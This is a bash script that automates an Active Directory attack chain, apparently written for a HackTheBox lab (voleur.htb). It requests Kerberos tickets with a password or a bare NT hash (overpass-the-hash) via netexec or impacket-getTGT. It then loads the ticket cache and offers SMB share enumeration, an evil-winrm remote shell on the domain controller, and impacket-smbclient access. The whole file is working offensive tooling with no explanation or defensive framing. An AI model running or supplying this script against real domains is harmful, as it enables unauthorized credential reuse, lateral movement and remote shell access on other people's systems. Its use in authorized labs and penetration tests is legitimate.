#!/bin/bash

# === Kerberos Ticket Automation Script ===
echo "==== Kerberos Automation Script ===="

# Function to validate IP address
validate_ip() {
    local ip=$1
    if [[ ! $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        echo "[!] Invalid IP address: $ip"
        exit 1
    fi
}

# Function to validate non-empty input
validate_non_empty() {
    local input=$1
    local name=$2
    if [ -z "$input" ]; then
        echo "[!] $name cannot be empty"
        exit 1
    fi
}

# Function to check if a tool is installed
check_tool() {
    local tool=$1
    if ! command -v "$tool" >/dev/null 2>&1; then
        if ! sudo bash -c "command -v $tool" >/dev/null 2>&1; then
            echo "[!] $tool not found. Please install it using your package manager, e.g., 'sudo apt install $tool'."
            exit 1
        else
            echo "[*] $tool is only accessible with sudo. The script will use sudo to run it."
        fi
    fi
}

# Function to reset Kerberos environment
reset_krb_env() {
    export KRB5CCNAME="$(pwd)/$CCACHE_FILE"
    echo "[*] Resetting Kerberos ticket environment: export KRB5CCNAME=$(pwd)/$CCACHE_FILE"
}

# Function to check if DC IP is reachable
check_reachability() {
    local ip=$1
    echo "[*] Running: ping -c 4 $ip to check reachability..."
    ping -c 4 "$ip" >/dev/null 2>&1
    if [ $? -ne 0 ]; then
        echo "[!] $ip is not reachable. Check network connectivity."
        exit 1
    fi
    echo "[*] $ip is reachable."
}

# Function to check and update /etc/hosts
check_hosts() {
    local ip=$1
    local dc_host=$2
    local domain=$3
    if ! grep -q "$ip.*$dc_host" /etc/hosts; then
        echo "[!] $dc_host ($ip) not found in /etc/hosts."
        read -p "Add $ip $dc_host $domain to /etc/hosts? (y/n): " ADD_HOSTS
        if [ "$ADD_HOSTS" == "y" ]; then
            cmd="echo '$ip $dc_host $domain' | sudo tee -a /etc/hosts"
            echo "[*] Running: $cmd"
            echo "$ip $dc_host $domain" | sudo tee -a /etc/hosts >/dev/null
            if [ $? -ne 0 ]; then
                echo "[!] Failed to update /etc/hosts. Check sudo permissions."
                exit 1
            fi
        else
            echo "[*] Skipping /etc/hosts update."
        fi
    else
        echo "[*] $dc_host ($ip) found in /etc/hosts."
    fi
}

# Prompt for user inputs
read -p "Enter domain (e.g., voleur.htb): " DOMAIN
validate_non_empty "$DOMAIN" "Domain"
read -p "Enter username (e.g., svc_ldap): " USER
validate_non_empty "$USER" "Username"
read -p "Enter Domain Controller IP (e.g., 10.10.11.76): " DC_IP
validate_ip "$DC_IP"
read -p "Enter Domain Controller hostname (e.g., dc.voleur.htb): " DC_HOST
validate_non_empty "$DC_HOST" "Domain Controller hostname"

# Check if DC IP is reachable
check_reachability "$DC_IP"

# Check /etc/hosts for domain and DC hostname
check_hosts "$DC_IP" "$DC_HOST" "$DOMAIN"

# Ask for credential type
read -p "Do you have a password or NT hash? (p/h): " TYPE
validate_non_empty "$TYPE" "Credential type"

# Function to generate TGT
generate_tgt() {
    local type=$1
    local method=$2
    local password=$3
    local nthash=$4
    local cmd
    local output
    local ret

    if [ "$type" == "p" ]; then
        if [ "$method" == "n" ]; then
            check_tool "netexec"
            cmd="netexec smb $DC_IP -u $USER -p [hidden] -k --generate-tgt $USER"
            echo "[*] Running: $cmd"
            # Run without output capture to ensure file creation works
            netexec smb "$DC_IP" -u "$USER" -p "$password" -k --generate-tgt "$USER"
            ret=$?
        else
            check_tool "impacket-getTGT"
            cmd="impacket-getTGT $DOMAIN/$USER:[hidden] -dc-ip $DC_IP"
            echo "[*] Running: $cmd"
            # Run without output capture
            impacket-getTGT "$DOMAIN/$USER:$password" -dc-ip "$DC_IP"
            ret=$?
        fi
    else
        check_tool "impacket-getTGT"
        cmd="impacket-getTGT -hashes :[hidden] -dc-ip $DC_IP $DOMAIN/$USER"
        echo "[*] Running: $cmd"
        # Run without output capture
        impacket-getTGT -hashes ":$nthash" -dc-ip "$DC_IP" "$DOMAIN/$USER"
        ret=$?
    fi

    if [ $ret -ne 0 ]; then
        echo "[!] TGT generation command failed with exit code $ret"
        return 2
    else
        return 0
    fi
}

# Handle TGT generation based on credential type
if [ "$TYPE" == "p" ]; then
    read -p "Enter password (visible): " PASSWORD
    echo
    validate_non_empty "$PASSWORD" "Password"
    read -p "Do you want to use netexec or impacket-getTGT to request the ticket? (n/i): " METHOD
    validate_non_empty "$METHOD" "Method"

    if [ "$METHOD" != "n" ] && [ "$METHOD" != "i" ]; then
        echo "[!] Invalid method. Use 'n' for netexec or 'i' for impacket-getTGT."
        exit 1
    fi

    generate_tgt "p" "$METHOD" "$PASSWORD" ""
    ret=$?
    if [ $ret -ne 0 ]; then
        echo "[!] TGT generation failed"
        exit 1
    fi
elif [ "$TYPE" == "h" ]; then
    read -p "Enter NT hash (only the NT hash): " NTHASH
    validate_non_empty "$NTHASH" "NT hash"
    generate_tgt "h" "" "" "$NTHASH"
    ret=$?
    if [ $ret -ne 0 ]; then
        echo "[!] TGT generation failed"
        exit 1
    fi
else
    echo "[!] Invalid choice. Use 'p' for password or 'h' for NT hash."
    exit 1
fi

# Set and validate the Kerberos ticket environment variable
# Determine correct ccache filename based on method
CCACHE_FILE="$USER.ccache"
if [ "$TYPE" == "p" ] && [ "$METHOD" == "i" ]; then
    CCACHE_FILE="ccache_$USER"
elif [ "$TYPE" == "h" ]; then
    CCACHE_FILE="ccache_$USER"
fi

if [ -f "$CCACHE_FILE" ]; then
    echo "[*] Setting Kerberos ticket environment variable"
    export KRB5CCNAME="$(pwd)/$CCACHE_FILE"
    echo "[*] Exported: export KRB5CCNAME=$(pwd)/$CCACHE_FILE"
    # Verify ticket with klist if available
    if command -v klist >/dev/null 2>&1; then
        echo "[*] Verifying ticket with klist..."
        klist_output=$(KRB5CCNAME="$(pwd)/$CCACHE_FILE" klist 2>&1)
        if [ $? -eq 0 ]; then
            echo "[*] Ticket appears valid:"
            echo "$klist_output"
        else
            echo "[!] Ticket verification failed: $klist_output"
            echo "[!] Possible Kerberos configuration issue. Check /etc/krb5.conf and ensure ticket is valid."
            exit 1
        fi
    else
        echo "[*] klist not found, skipping ticket verification."
    fi
else
    echo "[!] Ticket cache not found: $CCACHE_FILE"
    echo "[*] Searching for other possible ticket files..."
    # Look for any ccache files
    found_files=$(ls -1 *.ccache ccache_* 2>/dev/null)
    if [ -n "$found_files" ]; then
        echo "[*] Found ticket files:"
        echo "$found_files"
        read -p "Enter the correct ticket filename: " CCACHE_FILE
        if [ -f "$CCACHE_FILE" ]; then
            echo "[*] Setting Kerberos ticket environment variable"
            export KRB5CCNAME="$(pwd)/$CCACHE_FILE"
            echo "[*] Exported: export KRB5CCNAME=$(pwd)/$CCACHE_FILE"
        else
            echo "[!] Ticket file not found: $CCACHE_FILE"
            exit 1
        fi
    else
        echo "[!] No ticket files found. TGT generation may have failed."
        exit 1
    fi
fi

# Prompt for post-auth commands
read -p "Do you want to run post-auth commands (netexec, evil-winrm, impacket-smbclient)? (y/n): " RUN_POST
if [ "$RUN_POST" == "y" ]; then
    echo "Select which command to run:"
    echo "1) netexec"
    echo "2) evil-winrm"
    echo "3) impacket-smbclient"
    echo "4) all"
    read -p "Your choice: " CHOICE
    validate_non_empty "$CHOICE" "Command choice"

    # Define function to reset Kerberos environment
    reset_krb_env() {
        export KRB5CCNAME="$(pwd)/$CCACHE_FILE"
        echo "[*] Resetting Kerberos ticket environment: export KRB5CCNAME=$(pwd)/$CCACHE_FILE"
    }

    case "$CHOICE" in
        1)
            reset_krb_env
            check_tool "netexec"
            cmd="netexec smb $DC_IP -u $USER -k --use-kcache --shares"
            echo "[*] Running: $cmd"
            netexec smb "$DC_IP" -u "$USER" -k --use-kcache --shares
            ;;
        2)
            reset_krb_env
            check_tool "evil-winrm"
            cmd="evil-winrm -i $DC_HOST -k -u $USER -r $DOMAIN"
            echo "[*] Running: $cmd"
            evil-winrm -i "$DC_HOST" -k -u "$USER" -r "$DOMAIN"
            ;;
        3)
            reset_krb_env
            check_tool "impacket-smbclient"
            cmd="impacket-smbclient -k $DOMAIN/$USER@$DC_HOST -dc-ip $DC_IP"
            echo "[*] Running: $cmd"
            impacket-smbclient -k "$DOMAIN/$USER@$DC_HOST" -dc-ip "$DC_IP"
            ;;
        4)
            # Run all commands with individual environment resets
            reset_krb_env
            check_tool "netexec"
            cmd="netexec smb $DC_IP -u $USER -k --use-kcache --shares"
            echo "[*] Running: $cmd"
            netexec smb "$DC_IP" -u "$USER" -k --use-kcache --shares

            reset_krb_env
            check_tool "evil-winrm"
            cmd="evil-winrm -i $DC_HOST -k -u $USER -r $DOMAIN"
            echo "[*] Running: $cmd"
            evil-winrm -i "$DC_HOST" -k -u "$USER" -r "$DOMAIN"

            reset_krb_env
            check_tool "impacket-smbclient"
            cmd="impacket-smbclient -k $DOMAIN/$USER@$DC_HOST -dc-ip $DC_IP"
            echo "[*] Running: $cmd"
            impacket-smbclient -k "$DOMAIN/$USER@$DC_HOST" -dc-ip "$DC_IP"
            ;;
        *)
            echo "[!] Invalid option. Skipping post-auth commands."
            ;;
    esac
else
    echo "[*] Skipping post-auth commands."
fi

echo "[*] Script completed."
